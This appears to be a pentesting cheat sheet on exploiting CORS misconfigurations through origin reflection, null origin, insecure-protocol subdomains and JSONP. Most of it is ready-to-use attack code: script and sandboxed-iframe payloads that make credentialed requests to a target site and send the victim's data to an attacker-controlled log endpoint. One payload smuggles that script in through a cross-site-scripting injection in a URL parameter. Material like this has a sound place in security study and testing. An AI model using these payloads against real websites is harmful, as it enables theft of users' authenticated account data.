---
title: Cross-Origin Resource Sharing (CORS) Attack
desc: 
tags: [Burp, CORS, Web]
alts: []
render_with_liquid: false
---

## Origin Reflection

1. **Change Origin Value of Request Header**

    ```sh
    Origin: https://attacker.com
    ```

    ```sh
    Origin: https://vulnerable.com.attacker.com
    ```

2. **Check if the Response Allowing Cross-Origin**

    It's reflected the previous reqeust in the response header, you can exploit it.

    ```sh
    Access-Control-Allow-Origin: https://attacker.com
    ```

    ```sh
    Access-Control-Allow-Origin: https://vulnerable.com.attacker.com
    Access-Control-Allow-Credentials: true
    ```

3. **Exploit with Your Malicious Web Page**

    For example, it's hosted as "https://attacker.com/exploit" or "https://vulnerable.com.attacker.com/exploit".  
    Add the JavaScript code in the web page.  

    It shows the users' sensitive information of the target website in your server's log.

    ```html
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://vulnerable.com/details', true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            location = '/log?key=' + this.responseText;
        }
    </script>
    ```

<br />

## Null origin

1. **Send Request with Origin: null**

    ```sh
    Origin: null
    ```

2. **Check if the Response Allowing Cross-Origin**

    ```sh
    Access-Control-Allow-Origin: null
    Access-Control-Allow-Credentials: true
    ```

3. **Add the iframe to Your Malicious Web Page**

    For example, it's hosted as "https://attacker.com/exploit".

    ```html
    <iframe
        sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('GET', 'https://vulnerable.com/details', true);
            req.withCredentials = true;
            req.send();
            
            function reqListener() {
                location = 'https://attacker.com/log?key=' + encodeURIComponent(this.responseText);
            }
            </script>"
    ></iframe>
    ```

<br />

## Insecure Protocol

1. **Send Request with Abbused Origin**

    ```sh
    Origin: http://subdomain.vulnerable.com
    ```

2. **Check if the Response Allowing Cross-Origin**

    ```sh
    Access-Control-Allow-Origin: http://subdomain.vulnerable.com
    Access-Control-Allow-Credentials: true
    ```

3. **Add the JavaScript Code to Your Malicious Web Page**

    It's hosted as "https://attacker.com/exploit"

    ```html
    <script>
        document.location="http://subdomain.vulnerable.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable.com/details',true); req.withCredentials = true;req.send();function reqListener() {location='https://attacker.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>
    ```

<br />

## JSONP (Json with Padding)

```html
<script>
	var userinfo = function (data) {
		alert(JSON.stringify(data));
	}
</script>
<script src="https://vulnerable.com/example.php?value=userinfo" type="text/javascriipt"></script>
```